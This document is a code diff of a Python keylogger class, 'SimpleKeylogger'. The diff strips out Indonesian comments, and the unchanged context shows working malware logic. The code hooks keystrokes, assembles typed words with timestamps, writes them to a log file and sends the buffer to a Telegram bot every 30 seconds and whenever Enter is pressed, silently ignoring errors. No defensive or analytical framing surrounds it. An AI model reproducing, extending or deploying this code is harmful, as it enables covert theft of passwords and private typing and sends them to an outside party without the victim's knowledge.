@@ -6,7 +6,7 @@ import requests
 import threading
 from dotenv import load_dotenv
 
-# Load environment variables from .env file
+
 load_dotenv()
 
 class SimpleKeylogger:
@@ -15,7 +15,7 @@ class SimpleKeylogger:
         self.start_time = datetime.datetime.now()
         self.key_count = 0
         self.current_word = ""
-        self.buffer = ""  # Buffer untuk akumulasi log sebelum dikirim
+        self.buffer = ""  
         self.telegram_token = telegram_token
         self.telegram_chat_id = telegram_chat_id
         self.running = True
@@ -23,7 +23,6 @@ class SimpleKeylogger:
         self.timer_interval = 30  # detik
 
     def send_telegram(self, message):
-        """Kirim pesan ke Telegram"""
         if not self.telegram_token or not self.telegram_chat_id:
             return
         try:
@@ -31,22 +30,18 @@ class SimpleKeylogger:
             data = {"chat_id": self.telegram_chat_id, "text": message}
             requests.post(url, data=data, timeout=5)
         except Exception:
-            # Abaikan error, tidak perlu mengganggu proses utama
             pass
 
     def flush_buffer(self):
-        """Tulis buffer ke file dan kirim ke Telegram, lalu kosongkan"""
-        if self.buffer:
-            # Tulis ke file
+        if self.buffer: 
             with open(self.filename, "a", encoding="utf-8") as f:
                 f.write(self.buffer)
-            # Kirim ke Telegram
+
             self.send_telegram(self.buffer)
-            # Kosongkan buffer
+
             self.buffer = ""
 
     def periodic_flush(self):
-        """Fungsi periodik untuk mengirim buffer"""
         if self.running:
             self.flush_buffer()
             self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
@@ -76,13 +71,10 @@ class SimpleKeylogger:
         print()
 
     def display_word(self):
-        """Mencatat kata yang sudah diketik ke dalam buffer"""
         if self.current_word:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
             word_entry = f"[{current_time}] [WORD] {self.current_word}\n"
-            # Tampilkan di console
             print("\033[1;36m[WORD]\033[0m {}".format(self.current_word))
-            # Tambahkan ke buffer
             self.buffer += word_entry
             self.current_word = ""
 
@@ -93,7 +85,6 @@ class SimpleKeylogger:
             log_entry = f"[{current_time}] {char}\n"
             self.key_count += 1
             self.current_word += char
-            # Tampilkan di console
             print("\033[1;32m[{}]\033[0m {}".format(current_time, char))
         except AttributeError:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
@@ -121,16 +112,14 @@ class SimpleKeylogger:
             self.key_count += 1
 
             if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
-                # Catat kata sebelum spasi/enter/tab
                 self.display_word()
-                # Jika tombol Enter, segera kirim buffer
                 if key == keyboard.Key.enter:
                     self.flush_buffer()
             elif key == keyboard.Key.backspace:
                 if self.current_word:
                     self.current_word = self.current_word[:-1]
             elif key == keyboard.Key.esc:
-                # Catat kata terakhir sebelum keluar
+   
                 if self.current_word:
                     self.display_word()
                 print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
@@ -177,7 +166,7 @@ class SimpleKeylogger:
         print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
         print("\033[1;37m" + "-" * 70 + "\033[0m\n")
 
-        # Mulai timer periodik jika Telegram diaktifkan
+
         if self.telegram_token and self.telegram_chat_id:
             self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
             self.timer.daemon = True
@@ -190,7 +179,7 @@ class SimpleKeylogger:
             self.running = False
             if self.timer:
                 self.timer.cancel()
-            # Kirim sisa buffer sebelum keluar
+           
             self.flush_buffer()
             self.print_footer()
 
